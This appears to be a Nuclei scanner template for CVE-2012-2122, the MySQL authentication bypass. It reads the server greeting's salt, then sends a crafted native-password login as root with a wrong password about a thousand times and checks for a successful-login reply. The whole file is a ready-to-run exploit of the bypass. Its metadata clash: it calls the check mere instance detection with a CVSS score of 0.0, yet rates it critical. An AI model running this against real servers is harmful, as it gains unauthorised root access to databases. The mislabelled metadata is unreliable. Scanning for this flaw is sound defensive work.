id: CVE-2012-2122
info:
  author: pussycat0x
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N
    cvss-score: 0.0
    cwe-id: CWE-200
  description: 'MySQL instance was detected.

    '
  metadata:
    shodan-query: product:"MySQL"
    verified: true
  name: CVE-2012-2122
  severity: critical
  tags: network,mysql,db
network:
- host:
  - '{{Host}}:3306'
  inputs:
  - extract:
      protocol: substr(greeting, 4, 5)
      salt1: substr(greeting, 16, 25)
      salt2: substr(greeting, 43, 56)
      version: substr(greeting, 5, 12)
    match:
    - contains(greeting, "mysql")
    name: greeting
    read: 1024
    type: hex
  - data: '{{mysql_login_request1+hex_encode(username)+''00''+mysql_login_request2+hex_encode(
      xor(hex_decode(sha1(password)), hex_decode(sha1(salt1+salt2+sha1(sha1(password)))))
      )+mysql_login_request3}}'
    name: login_response
    read: 1024
    type: hex
  matchers:
  - binary:
    - '0700000200000002000000'
    encoding: hex
    type: binary
  payloads:
    password:
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
    - test
variables:
  mysql_login_request1: 560000018da6ff1900000001ff0000000000000000000000000000000000000000000000
  mysql_login_request2: '14'
  mysql_login_request3: 6d7973716c006d7973716c5f6e61746976655f70617373776f726400
  username: root
